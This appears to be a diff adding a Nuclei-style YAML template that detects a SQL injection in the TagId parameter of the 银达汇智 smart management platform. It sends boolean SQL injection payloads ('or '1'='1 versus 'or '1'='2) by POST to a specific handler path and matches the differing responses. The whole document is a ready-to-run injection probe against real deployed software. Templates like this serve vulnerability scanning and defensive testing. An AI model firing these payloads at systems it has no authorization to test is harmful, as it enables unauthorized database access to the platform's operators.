@@ -1,0 +1,45 @@
+id: poc-yaml-windor-icmp-tagid-sqli
+info:
+  name: 银达汇智 智慧综合管理平台 TagId SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=findCheckData&TagId='or '1'='1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[]"
+        part: body
+      - type: word
+        words:
+          - "SessionId"
+        part: header
+  - raw:
+      - |
+        POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=findCheckData&TagId='or '1'='2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "未将对象引用设置到对象的实例"
+          - "应用程序中的服务器错误"
+          - "System.Web.HttpApplication"
+        part: body
